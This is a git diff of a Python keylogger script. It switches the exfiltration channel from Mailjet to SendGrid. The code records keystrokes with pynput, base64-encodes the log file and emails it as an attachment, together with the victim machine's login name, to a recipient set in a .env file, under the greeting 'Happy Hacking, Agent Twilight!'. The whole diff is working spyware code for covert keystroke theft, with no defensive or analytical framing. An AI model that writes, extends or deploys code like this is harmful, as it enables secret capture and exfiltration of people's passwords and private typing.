@@ -1,6 +1,8 @@
 # from pynput.keyboard import Listener
 from dotenv import get_key
-from mailjet_rest import Client
+from sendgrid import SendGridAPIClient
+from sendgrid.helpers.mail import Mail,Attachment,FileContent,FileName,FileType,Disposition,ContentId
+
 import base64
 import os
 from pynput import keyboard
@@ -48,32 +50,29 @@ class Keylogger:
             f.close()
 
 if __name__ == '__main__':
-    MAILJET_API_USERNAME_KEY = get_key(dotenv_path=".env",key_to_get="MAILJET_API_USERNAME_KEY")
-    MAILJET_API_SECRET_KEY = get_key(dotenv_path=".env",key_to_get="MAILJET_API_SECRET_KEY")
-    print(MAILJET_API_SECRET_KEY)
-    print(MAILJET_API_USERNAME_KEY)
     keylogger = Keylogger()
-    mailjetClient = Client(auth=(MAILJET_API_USERNAME_KEY,MAILJET_API_SECRET_KEY), version='v3.1')
+    key = get_key(dotenv_path=".env",key_to_get='SENDGRID_API_KEY')
+    sg = SendGridAPIClient(api_key=str(key))
     loginName = os.getlogin()
     with open(keylogger.filename,'rb') as file:
         b64content = base64.b64encode(file.read()).decode('utf-8')
         print(b64content)
     file.close()
-    data = {
-        "FromEmail": str(get_key(dotenv_path=".env",key_to_get="FROM")),
-    "FromName": "Ali hassan",
-    "Subject": f"Keylogger File - SENT AT : {str(time.strftime("%Y-%m-%d-%H-%M-%S"))}",
-    "Text-part": f"This is the file containing the key strokes from the PC {loginName if loginName else "loginNotFound"}",
-    "Html-part": '<h1>Happy Hacking, Agent Twilight!</h1>',
-    "Recipients": [{"Email": str(get_key(dotenv_path=".env",key_to_get="RECIPIENT"))}],
-    "Attachments": [
-								{
-										"ContentType": "text/plain",
-										"Filename": keylogger.filename,
-										"Base64Content": b64content
-								}
-						]
-    }
-    result = mailjetClient.send.create(data=data)
-    print(result.status_code)
-    print(result.json())
+    message = Mail(
+        from_email=str(get_key(dotenv_path=".env",key_to_get="FROM")),
+    subject=f"Keylogger File - SENT AT : {str(time.strftime("%Y-%m-%d-%H-%M-%S"))}",
+    html_content=f'<h1>Happy Hacking, Agent Twilight!</h1> <br> <strong> This is the file containing the key strokes from the PC {loginName if loginName else "loginNotFound"} </strong>',
+    to_emails=str(get_key(dotenv_path=".env",key_to_get="RECIPIENT"))
+    )
+    message.attachment = Attachment(FileContent(b64content),
+                                FileName(keylogger.filename),
+                                FileType('plain/text'),
+                                Disposition('attachment'),
+                                ContentId(keylogger.filename))
+    try:
+        response = sg.send(message)
+        print(response.status_code)
+        print(response.body)
+        print(response.headers)
+    except Exception as e:
+        print(e)
